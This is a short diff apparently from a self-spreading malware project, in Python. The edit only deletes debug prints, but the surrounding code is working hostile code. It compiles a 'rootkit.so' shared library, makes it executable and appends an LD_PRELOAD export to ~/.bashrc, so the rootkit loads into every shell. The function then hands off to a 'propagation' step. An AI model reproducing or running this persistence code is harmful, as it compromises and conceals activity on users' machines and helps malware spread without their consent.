@@ -31,14 +31,11 @@ def run():
     subprocess.run(
         "gcc -fPIC -shared -o ./utils/rootkit.so ./utils/rootkit.c -ldl", shell=True
     )
-    print("1")
     subprocess.run(f"chmod 755 {dir_path}/../utils/rootkit.so", shell=True)
-    print("2")
     subprocess.run(
         f"echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so' >> ~/.bashrc && . ~/.bashrc",
         shell=True,
     )
-    print("3")
 
     next_action = "propagation"
     return data, next_action
